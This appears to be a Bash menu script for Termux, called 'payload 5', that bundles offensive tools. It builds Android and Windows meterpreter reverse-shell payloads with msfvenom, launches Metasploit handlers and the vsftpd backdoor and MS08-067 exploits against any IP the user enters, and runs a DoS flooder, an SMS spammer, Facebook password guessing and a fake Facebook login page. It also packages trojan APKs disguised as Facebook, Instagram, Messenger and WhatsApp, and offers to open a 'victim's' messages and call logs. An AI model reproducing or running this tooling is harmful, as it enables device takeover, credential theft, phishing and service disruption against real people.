clear

#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install




cd $HOME/payload5


echo -e "$green "

figlet  -f big "           payload 5  "
echo -e "$blue"
echo '        .e$$$$e.'
sleep 0.1
echo '      e$$$$$$$$$$e'"                        &&&&&&&&&&&&&"
sleep 0.1
echo -e '     $$$$$$$$$$$$$$'"                       & $green ali.max $blue &"
sleep 0.1
echo '    d$$$$$$$$$$$$$$b'"                      &&&&&&&&&&&&&"
echo '    $$$$$$$$$$$$$$$$                    '
sleep 0.1
echo -e '   4$$$$$$$$$$$$$$$$F'$y '                    ['$cyan "30" $y']' $blue"facebook"
sleep 0.1
echo -e '   4$$$$$$$$$$$$$$$$F'$y '                    ['$cyan "40" $y']'$red" YouTube"$blue
sleep 0.1
echo -e '    $$$" "$$$$" "$$$'"$g     5.8.3     ""$blue"
echo  '    $$F   4$$F   4$$===============||'
sleep 0.1
echo -e '     $F '$green"&" $blue'4$$F '$green"&"$blue  '4$                ||       '
echo '     $$   $$$$   $$                ||      '
sleep 0.1
echo '     $$$$$$""$$$$$$                ||     '
echo -e '      $$$F'$green "o"$blue '4$$$$                 || '
sleep 0.1
echo '       "$$$ee$$$"                  ||'
echo '        4*$$$$F4                \  ||  /'
sleep 0.1
echo -e '        $ '$green"----"$blue'.$                 \ || /'
echo -e '        "$$$$$$"   '$cyan'  [90]helpℹ️ '$blue'   \||/   '   
echo '          $$$$                     \/       '
sleep 0.1
echo -e "               $bluo p $green a $reset y $purple l $cyan o $yellow a $green d"
#echo -e "$red"
#echo '                               exit=CTRL+c'
echo -e "$green+________________________________________________________+"
echo -e "$cyan|  [1] metasploit ⚔️|  $blue  [2] nmap 🌎| $purple  [3] dos attack ⛔ |             "
#echo -e "| $green            --------------------------------            |  "
echo -e "$yellow|  [4]   ngrok 🌐  |  $red  [5] virus ☢️️|  $reset [6]   Termux 📟   |    "
#echo "                                        "
echo -e " $purple       |   [7]facebook             [8]Encrypt    |"
echo -e " $green          --------------------------------------"


echo -e " $red "
echo -e " [00] Exit           $green                          [99] update"
#echo -e "$green"
echo -e "$cyan"
echo -e "|---{$yellow my ip$cyan }---| " 
       curl ifconfig.me
echo -e "$blue"
ifconfig wlan0 | grep -o 192..........
#echo -e "$green "
#date
echo -e "$yellow"
#echo ''
read -p  " number =====> " ali

p(){
echo -e "$blue "
read -p "                  ip=====> " ip
sleep 2
read -p "                      port===> " p
sleep 2
read -p "                        name===> " n

cd
cd metasploit-framework

./msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p R >  /sdcard/payload5/$n.apk
echo -e " $cyan  Path of the pyload----->  $yellow  /sdcard/payload5/$n.apk"
echo -e "$purple end the payload+++++++++++++++++++++++ "
sleep 2
cd $HOME/payload5
read -p "                  --------> entar"
payload.sh
}
#--------------------------------------------------

Encrypt(){
echo -e "$red                                          [00]back"
echo -e "$blue"
echo "      [1]Encrypt python"
echo "      [2]Encrypt python 2"
echo ""
echo -e "$green"
read -p "number------->" EE
if [ "$EE" -eq "1"  ]; then
 cd /sdcard/payload5/Encrypt
 echo -e "$cyan" && ls
 echo -e "$green"
 read -p "name-------->" pp
 echo "import" $pp > max.py
 clear
 python max.py
 payload.sh
elif [ "$EE" -eq "2"  ]; then
 cd /sdcard/payload5/Encrypt
 ls
 echo -e "$green"
 read -p "name-------->" pp
 echo "import" $pp > max.py
 clear
 python2 max.py
 payload.sh
elif [ "$EE" -eq "00"  ]; then
 payload.sh
else :
 clear
 Encrypt
fi

}






#--------------------------------------------------





w(){

echo -e "$purple"
read -p "                  ip=====> " ipp
sleep 2
read -p "                      port===> " pp
sleep 2
read -p "                        name===> " nn

cd
cd metasploit-framework

./msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$pp -f exe e >  /sdcard/payload5/$nn.exe
echo -e "$cyan    Path of the pyload-----> $yellow  /sdcard/payload5/$nn.exe"
echo -e "$purple end the payload+++++++++++++++++++++ "
sleep 2
cd $HOME/payload5
read -p "                   -------->entar"
payload.sh
}
#--------------------------------------------------

d(){
rm -rf $HOME/metasploit-framework
rm -rf $HOME/metasploit.sh
cp .metasploit.sh $HOME/metasploit.sh
chmod +x $HOME/metasploit.sh
sh $HOME/metasploit.sh



}

#--------------------------------------------------

#--------------------------------------------------

nd(){
apt $n  nmap -y

payload.sh
}

#--------------------------------------------------


ip(){

read -p "            ip-------->" ip
apt $n  nmap -y
clear
nmap $ip
sleep 3
read -p "                   ------------>entar"
payload.sh
}

#--------------------------------------------------
hm(){
read -p "                   ip/link------>" ip
read -p "                      port/80---->" pr
read -p "                         Time in seconds---->" ti
pkg $n python
clear
echo -e "$green"
cd .hammer
chmod +x hammer.py
python hammer.py -s $ip -p $pr -t $ti


}

#--------------------------------------------------
all(){
apt $n  nmap -y
clear
nmap -sn 192.168.1.1/24
read -p "                        ---------->entar"
payload.sh

}


ii(){
cd $HOME/payload5
chmod +x .help.sh
./.help.sh

read -p "         -------> entar(back) +++++++>" ss
if [ "$ss" -eq "1"  ]; then
termux-open https://www.facebook.com/ali.max.796774
payload.sh

elif [ "$ss" -eq "2"  ]; then

termux-open https://www.youtube.com/channel/UCTlvUAypIKJ2BCUaUHKwrxg
payload.sh
else
payload.sh
fi
}
#--------------------------------------------------
te(){
read -p "            name-------> " ali
cd
rm $HOME/.bashrc
rm ../usr/etc/bash.bashrc
sed "s/Sniper/$ali/" $HOME/payload5/.bashrc > $HOME/.bashrc
pkg install figlet

payload.sh


}


#--------------------------------------------------
pkp(){

apt $n nano -y &&  apt $n wgit -y && apt $n fish -y


payload.sh
}


aaa(){
echo -e "$cyan"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd $HOME/payload5/.msf
echo "use exploit/multi/handler" > .msf.rc
echo "set payload android/meterpreter/reverse_tcp" >> .msf.rc
echo "set lhost $ip" >> .msf.rc
echo "set lport $port" >> .msf.rc
echo "exploit" >> .msf.rc
msfconsole -r .msf.rc


}
#--------------------------------------------------
www(){
echo -e "$red"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd $HOME/payload5/.msf
echo "use exploit/multi/handler" > .msf1.rc
echo "set payloads windows/meterpreter/reverse_tcp" >> .msf1.rc
echo "set lhost $ip" >> .msf1.rc
echo "set lport $port" >> .msf1.rc
echo "exploit" >> .msf1.rc
msfconsole -r .msf1.rc


}
#--------------------------------------------------
error(){

echo -e "++++++++++++++++> please wait <++++++++++++++++"
cd .msf
chmod +x *
sh .error.sh

}
#--------------------------------------------------
up(){
echo "                              (33)== back"
read -p " Enter update----------> " up
if [ "$up" -eq "33"  ]; then
payload.sh
else echo "                    -------> Hi new update <------"
cd 
setup5.sh




fi

}
#--------------------------------------------------


xxx(){
figlet  -f big  "             good bay  "






}


ngrok(){
echo -e "$yellow"
echo "                           open the http://www.ngrok.com"
echo "                   The link starts (./ngrok)"
echo ""
echo "                           [0] back"
termux-open http://www.ngrok.com
read -p "link- - - - > " link
if [ "$link" -eq "0"  ]; then
payload.sh
else
echo -e "$green"
cp $HOME/payload5/.ngrok/ngrok $HOME
cd $HOME && chmod 777 ngrok
$link
echo -e "$yellow"
echo "                                   good pay"

fi
}

#--------------------------------------------------



ngk(){
echo "                                       [0]back"
read -p "         [port]- - - > " port
if [ "$port" -eq "0"  ]; then
payload.sh
else
cd &&  ./ngrok http $port
fi

}
#--------------------------------------------------



ngkk(){
echo "                                       [0]back"
read -p "         [port]- - - > " port
if [ "$port" -eq "0"  ]; then
payload.sh
else
cd && ./ngrok tcp $port
fi

}


sms(){
echo -e "$red"
echo "                                 [0]back"
echo -e "$green    "
cd $HOME/payload5/.msf && ls
echo ""
read -p "name.txt ------> " n
if [ "$n" -eq "0"  ]; then
cd $HOME/payload5
payload.sh
else
termux-open $n
fi
}

openn(){
echo -e "$red"
echo "                                 [0]back"
echo -e "$green    "
cd $HOME/payload5/.msf && ls
echo ""
read -p "name photo ------> " n
echo -e "$green"
if [ "$n" -eq "0"  ]; then
cd $HOME/payload5
payload.sh
else
termux-open $n
echo "                                   good pay"
fi



}





vir(){
echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
payload.sh
else
cd $HOME/payload5
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/payload5/.viros/Facebook.apk /sdcard/payload5
echo -e "$green               end the vairos----->(facebook) "
echo ""
echo "      Path of the pyload----->  sdcard/payload/facebook.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload.sh


}

viri(){
echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
payload.sh
else
cd $HOME/payload5
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/payload5/.viros/Instagram.apk /sdcard/payload5
echo -e "$green               end the vairos----->(Instagram) "
echo ""
echo "      Path of the pyload----->  sdcard/payload/Instagram.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload.sh


}


virm(){
echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
payload.sh
else
cd $HOME/payload5
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/payload5/.viros/Messenger.apk /sdcard/payload5
echo -e "$green               end the vairos----->(Messenger) "
echo ""
echo "      Path of the pyload----->  sdcard/payload/Messenger.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload.sh


}



virw(){
echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
payload.sh
else
cd $HOME/payload5
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/payload5/.viros/WhatsApp.apk /sdcard/payload5
echo -e "$green               end the vairos----->(WhatsApp) "
echo ""
echo "      Path of the pyload----->  sdcard/payload/WhatsApp.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload.sh


}




virr(){

echo -e " $blue"
echo "                            [0]back"
read -p "  name -------> " vv
if [ "$vv" -eq "0"  ]; then
payload.sh
else
cd $HOME/payload5
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/payload5/.viros/virs.apk /sdcard/payload5/$vv.apk
echo -e "$green               end the vairos----->($vv.apk)"
echo ""
echo "      Path of the pyload----->  sdcard/payload/$vv.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload.sh

}


fac(){
echo -e "  $red         [1]add password        [0]back"
echo ""
echo -e " $green      id = E-mail "
echo "               password = password.txt "
read -p "            entat   " ali
if [ "$ali" -eq "1"  ]; then
nano $HOME/payload5/.facebook/password.txt
payload.sh
elif [ "$ali" -eq "0" ]; then
payload.sh
else
pkg $n python2
pip2 install mechanize
clear
sh $HOME/payload5/.cxcxcx.sh
echo -e " $yellow                 password = password.txt"
echo -e "$green"
cd $HOME/payload5/.facebook
python2 $HOME/payload5/.facebook/facebook.py
sleep 1000000

fi

}
smms(){
pkg $n python2
clear
cd .Spammer-Grab

chmod +x auto-install.sh spammer.py
echo -e "$yellow"
read -p "       Enter the number ----> " f
echo -e "$green"
sleep 0.3
echo "                            ===+ $f send++"
sleep 0.3
echo "                               =========+ $f send++"
sleep 0.3
echo "                                   ==============+ $f send++"
cd $HOME/payload5
chmod +x .fhon.sh
./.fhon.sh
./.fhon.sh
./.fhon.sh
./.fhon.sh
cd .Spammer-Grab
./auto-install.sh
python2 spammer.py --delay 30 $f
cd ..
payload.sh




}

msf5(){

echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
cd
git clone https://github.com/rapid7/metasploit-framework
bundle install

clear
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
gem install crass -v '1.0.4' --source 'https://rubygems.org/' 
cd
cd metasploit-framework
bundle update nokogiri
echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
sleep 1
payload.sh
}


mmxx(){
clear
cd
pip2 install mechanize
cd $HOME/payload5/.max
clear
python2 op.py





}



aaa3(){
echo -e "$cyan"
read -p "                  ip----->" ip
cd $HOME/payload5/.msf
echo "use exploit/unix/ftp/vsftpd_234_backdoor" > .3msf.rc
echo "set payload cmd/unix/interact" >> .3msf.$
echo "set RHOST $ip" >> .3msf.rc
echo "set RPORT 21" >> .3msf.rc
echo "exploit" >> .3msf.rc
msfconsole -r .3msf.rc


}


aaa4(){
echo -e "$cyan"
read -p "                  ip----->" ip
cd $HOME/payload5/.msf
echo "use windows/smb/ms08_067_netapi" > .4msf.rc
echo "set payload windows/meterpreter/bind_tcp" >> .4msf.rc
echo "set RHOST $ip" >> .4msf.rc
echo "set RPORT 445" >> .4msf.rc
echo "exploit" >> .4msf.rc
msfconsole -r .4msf.rc


}

ips(){
cd
python2 $HOME/payload5/.max/zz.py


}


semm(){

read -p "            name-------> " ali
cd
rm $HOME/.bashrc
rm ../usr/etc/bash.bashrc
sed "s/max/$ali/" $HOME/payload5/.max/bash.bashrc > ../usr/etc/bash.bashrc
pkg install figlet

payload.sh

}


semmm(){
read -p "            name-------> " ali
cd
rm $HOME/.bashrc
rm ../usr/etc/bash.bashrc
sed "s/YourSelF/$ali/" $HOME/payload5/.max/PROVE-TM > $HOME/.bashrc
pkg install figlet

payload.sh





}



weeman(){
cd
rm $HOME/payload5/.weeman/core/shell.py
rm $HOME/payload5/.weeman/core/shell.pyc
cd $HOME/payload5
clear
chmod +x .bvbv.sh
sh .bvbv.sh
echo -e "$green"
echo -e "=================>{$blue facebook$green }<==============="
echo -e "$cyan                    set url "
echo -e "$cyan                 set action_url "
read -p "    entar " max
if [ "$max" -eq "0"  ]; then
payload
else
cp $HOME/payload5/.max/shellf.py $HOME/payload5/.weeman/core/shell.py
cd $HOME/payload5/.weeman/
python2 weeman.py
payload






fi
}
facali(){
echo -e "$green"
echo -e "    ali.max: "$blue'https://www.facebook.com/ali.max.796774'

termux-open https://www.facebook.com/ali.max.796774
payload
}
yout(){
echo -e "$red"
echo -e '    (payload5)----'$green"ali.max "
termux-open https://www.youtube.com/channel/UCTlvUAypIKJ2BCUaUHKwrxg
payload


}
#--------------------------------------------------


if [ "$ali" -eq "1"  ]; then
#--------------------------------------------------

echo -e "$red                                          [00]back"
echo -e "$cyan"
echo "            [1]payload android 💉📲"
echo "            [2]payload windows 💉💻"
echo "            [3]Android penetration msf 📟📲"
echo "            [4]windows penetration msf 📟💻"
echo "            [5]Breakthrough via Port (21)💉"
echo "            [6]Breakthrough via Port (445)💉"
echo "            [7]open (sms,calllog,....txt) The victim 📞📩   "
echo "            [8]Open the victim files that you downloaded 📁 "
echo "            [9]Download msf ⬇️"
echo "            [10]error metasploit ⚠️             "
echo "            [11]Download msf (5.0.0)⬇️"
echo -e "$green"
read -p "     number------->  " alii
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------


if [ "$alii" -eq "1"  ]; then
        p
fi

if [ "$alii" -eq "2"  ]; then
     w


fi

if [ "$alii" -eq "3"  ]; then
        aaa

fi

if [ "$alii" -eq "4"  ]; then
        www
fi

if [ "$alii" -eq "5"  ]; then
        aaa3
fi

if [ "$alii" -eq "6"  ]; then
        aaa4
fi

if [ "$alii" -eq "7"  ]; then
        sms
fi

if [ "$alii" -eq "8"  ]; then
        openn
fi

if [ "$alii" -eq "9"  ]; then
        d
fi

if [ "$alii" -eq "10"  ]; then
        error
fi

if [ "$alii" -eq "00"  ]; then
        payload.sh
fi
if [ "$alii" -eq "11"  ]; then
	msf5
else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh
fi



#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
elif [ "$ali" -eq "2"  ]; then
echo -e "   $red                                       [00]back"
echo -e "$blue"
echo "          [1]check the ip 🔎"
echo "          [2]all Devices🎛"
echo "          [3]Guess on ip 🔭"
echo "          [4]Download nmap⬇️ "
echo -e "$green"
read -p "     number-------> " aallii

if [ "$aallii" -eq "1"  ]; then
        ip


fi

if [ "$aallii" -eq "2"  ]; then
        all


fi
if [ "$aallii" -eq "3"  ]; then
        ips
if [ "$aallii" -eq "4"  ]; then
        nd


fi

fi
if [ "$aallii" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh
fi

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
elif [ "$ali" -eq "3"  ]; then
echo -e " $red                                         [00]back"
echo -e "$purple"
echo "             [1]dos attack🌎"
echo ""
echo -e "$green"
read -p "     number------->  " allii

if [ "$allii" -eq "1"  ]; then
        hm
fi

if [ "$allii" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------

elif [ "$ali" -eq "4"  ]; then
echo -e "      $red                                    [00]back" 
echo -e "$yellow"
echo "           [1]open ngrok http 🌐"
echo "           [2]open ngrok tcp  🌐"
echo "           [3]Download ngrok ⬇️ "
echo -e "$green"
read -p "     number------->  " alli

if [ "$alli" -eq "1"  ]; then
        ngk
fi
if [ "$alli" -eq "2"  ]; then
        ngkk
fi
if [ "$alli" -eq "3"  ]; then
        ngrok
fi

if [ "$alli" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------


elif [ "$ali" -eq "5"  ]; then
echo -e "     $yellow                                     [00]back"
echo -e "$red"
echo "          [1]Create a semi-Facebook (virus)️️️☢️"
echo "          [2]Create a normal (virus)☢️"
echo "          [3]send sms to *********"
echo "          [4]Create a semi-Instagram (virus)️️️☢️"
echo "          [5]Create a semi-Messenger (virus)️️️☢️"
echo "          [6]Create a semi-WhatsApp (virus)️️️☢️"

echo -e "$green"
read -p "     number------->  " aall
if [ "$aall" -eq "1"  ]; then
        vir
fi
if [ "$aall" -eq "2"  ]; then
        virr
fi

if [ "$aall" -eq "3"  ]; then
        smms
fi


if [ "$aall" -eq "4"  ]; then
        viri
fi

if [ "$aall" -eq "5"  ]; then
        virm
fi

if [ "$aall" -eq "6"  ]; then
        virw
fi


if [ "$aall" -eq "00"  ]; then
        payload.sh
else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi
#--------------------------------------------------

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------

elif [ "$ali" -eq "6"  ]; then
echo -e "      $red                                    [00]back"
echo -e "$reset"
echo "             [1]Change the shape of Termux📟"
echo "             [2]Download nano python fish git️⬇️ "
echo "             [3]The shape of the skull Termux📟"
echo "             [4]The shape of the skull(2) Termux📟"
echo -e "$green"
read -p "     number------->  " al
if [ "$al" -eq "1"  ]; then
        te
fi

if [ "$al" -eq "2"  ]; then
        pkp
fi
if [ "$al" -eq "3"  ]; then
        semmm
fi

if [ "$al" -eq "4"  ]; then
        semm
fi
if [ "$al" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------

elif [ "$ali" -eq "7"  ]; then
echo -e "   $red                                       [00]back"
echo -e "$purple"
echo "         [1]Guess facebook"
echo "         [2]Available facebook"
echo "         [3]A fake page for Facebook"
echo -e "$green"
read -p "     number------->  " ala
if [ "$ala" -eq "1"  ]; then
        fac
fi
if [ "$ala" -eq "2"  ]; then
        mmxx
fi

if [ "$ala" -eq "3"  ]; then
        weeman
fi

if [ "$ala" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi


#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------

elif [ "$ali" -eq "00"  ]; then
	xxx

#--------------------------------------------------
elif [ "$ali" -eq "99"  ]; then
	up
#--------------------------------------------------
elif [ "$ali" -eq "90"  ]; then
        ii
#--------------------------------------------------
elif [ "$ali" -eq "8"  ]; then
Encrypt
#--------------------------------------------------
elif [ "$ali" -eq "40"  ]; then
        yout

#--------------------------------------------------
elif [ "$ali" -eq "30"  ]; then
        facali

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh
#--------------------------------------------------

#--------------------------------------------------
#--------------------------------------------------
#-}---------------------------------------------
fi
#--------------------------------------------------


